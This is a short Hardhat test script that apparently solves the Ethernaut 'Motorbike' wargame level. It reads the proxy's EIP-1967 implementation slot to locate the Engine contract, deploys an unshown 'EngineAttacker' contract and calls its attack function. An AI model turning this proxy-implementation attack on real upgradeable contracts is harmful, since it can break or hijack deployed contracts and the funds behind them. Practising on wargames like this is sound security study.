const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, attacker, challenge, tx

before(async () => {
    ;[s1] = await ethers.getSigners()
    const challengeAddress = await createChallenge(
        "0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6",
        ethers.utils.parseEther("0.001")
    )
    challenge = await ethers.getContractAt("Motorbike", challengeAddress)
})

it("solves the challenge", async function () {
    //get the address of the Engine contract
    let addressEngine = await ethers.provider.getStorageAt(
        challenge.address,
        "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
    )

    addressEngine = "0x" + addressEngine.slice(-40)
    console.log("Address of the Engine contract: ", addressEngine)

    const engineFactory = await ethers.getContractFactory("Engine")
    let engine = await engineFactory.attach(addressEngine)

    console.log("Upgrader address: ", await engine.upgrader())

    const attackerFactory = await ethers.getContractFactory("EngineAttacker")
    attacker = await attackerFactory.deploy(engine.address)

    tx = await attacker.attack()
    await tx.wait()
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
